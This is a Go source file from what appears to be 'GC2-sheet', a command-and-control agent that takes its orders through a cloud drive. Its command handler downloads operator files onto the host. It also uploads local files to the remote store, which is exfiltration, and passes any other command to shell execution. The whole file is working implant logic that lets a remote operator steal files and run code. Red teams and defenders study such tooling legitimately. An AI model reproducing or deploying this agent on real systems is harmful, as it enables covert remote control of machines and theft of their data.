package C2

import (
	"GC2-sheet/internal/utils"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
)

var ErrorDownloadCommand = fmt.Errorf(
	"the provided download command couldn't be fullfilled",
)
var ErrorUploadCommand = fmt.Errorf(
	"the provided upload command couldn't be fullfilled",
)

func performCommandExecution(fs FileSystem, commandToExecute string) (*string, error) {
	splittedCommand := strings.Split(commandToExecute, ";")

	switch splittedCommand[0] {
	case "download":
		if len(splittedCommand) != 3 {
			return nil, ErrorDownloadCommand
		}

		fileDriveId := splittedCommand[1]
		downloadPath := splittedCommand[2]

		utils.LogDebug("New download command: FileId " + fileDriveId + " saving it to: " + downloadPath)
		fileContent, err := fs.pullFile(fileDriveId)
		if err != nil {
			return nil, fmt.Errorf("%w: %w", ErrorDownloadCommand, err)
		}

		err = saveFile(downloadPath, fileContent)
		if err != nil {
			return nil, fmt.Errorf("%w: %w", ErrorDownloadCommand, err)
		}

		output := "File Downloaded"
		return &output, nil
	case "upload":
		if len(splittedCommand) != 2 {
			return nil, ErrorUploadCommand
		}

		uploadFilePath := splittedCommand[1]

		utils.LogDebug("New upload command: file path: " + uploadFilePath)
		fileName := filepath.Base(uploadFilePath)
		file, err := os.Open(uploadFilePath)
		defer func(file *os.File) {
			err := file.Close()
			if err != nil {
				log.Printf("An error occured while closing the file during performCommandExecution: %s\n", err)
			}
		}(file)
		if err != nil {
			return nil, fmt.Errorf("%w: %w", ErrorUploadCommand, err)
		}
		err = fs.pushFile(fileName, file)
		if err != nil {
			return nil, fmt.Errorf("%w: %w", ErrorUploadCommand, err)
		}

		output := "File Uploaded"
		return &output, nil
	case "exit":
		Exit()
	}

	output := executeCommand(commandToExecute)
	return &output, nil
}
